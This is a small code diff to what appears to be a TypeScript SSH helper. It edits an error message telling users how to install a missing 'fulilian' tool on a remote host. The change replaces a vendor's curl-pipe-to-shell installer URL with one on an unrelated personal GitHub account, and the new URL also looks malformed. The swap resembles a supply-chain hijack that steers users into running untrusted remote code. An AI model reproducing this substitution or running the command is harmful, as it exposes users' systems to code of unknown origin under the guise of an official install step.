@@ -236,7 +236,7 @@ async function locateFulilian(ssh, remoteFulilianPath) {
 
   const err: any = new Error(
     'Fulilian is not installed on the remote host (could not find a `fulilian` executable). ' +
-      'Install it on the remote with:  curl -fsSL https://hermes-agent.nousresearch.com/install.sh | sh  ' +
+      'Install it on the remote with:  curl -fsSL https://github.com/xujuan-cyber/fulilianstall.sh | sh  ' +
       '— or set the Fulilian path explicitly in the SSH connection settings.'
   )
 
